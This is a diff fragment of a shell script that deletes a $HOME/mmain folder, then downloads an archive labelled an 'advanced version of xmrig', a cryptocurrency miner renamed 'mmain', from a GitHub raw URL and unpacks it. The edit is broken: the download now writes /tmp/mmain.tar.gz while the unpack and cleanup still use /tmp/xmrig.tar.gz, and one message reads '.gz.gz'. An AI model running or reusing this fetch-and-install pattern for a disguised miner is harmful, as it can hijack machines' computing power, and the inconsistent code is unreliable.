@@ -97,15 +97,15 @@ echo "[*] Removing $HOME/mmain directory"
 rm -rf $HOME/mmain
 
 echo "[*] Downloading mmain advanced version of xmrig to /tmp/xmrig.tar.gz"
-if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz" -o /tmp/xmrig.tar.gz; then
-  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz file to /tmp/xmrig.tar.gz"
+if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz" -o /tmp/mmain.tar.gz; then
+  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz file to /tmp/mmain.tar.gz.gz"
   exit 1
 fi
 
 echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmain"
 [ -d $HOME/mmain ] || mkdir $HOME/mmain
 if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmain; then
-  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmain directory"
+  echo "ERROR: Can't unpack /tmp/mmain.tar.gz to $HOME/mmain directory"
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
